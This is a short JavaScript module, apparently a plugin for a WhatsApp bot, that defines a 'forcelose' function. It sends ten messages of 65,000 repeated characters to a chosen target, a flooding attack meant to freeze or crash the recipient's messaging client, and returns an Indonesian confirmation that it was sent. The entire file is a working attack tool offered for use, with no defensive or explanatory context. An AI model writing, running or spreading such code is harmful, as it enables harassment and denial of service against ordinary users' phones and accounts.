async function forcelose(sock, target) {
    const chars = 'A'.repeat(65000);
    for (let i = 0; i < 10; i++) {
        await sock.sendMessage(target, { text: chars });
    }
    return '✅ Forcelose dikirim';
}
module.exports = forcelose;
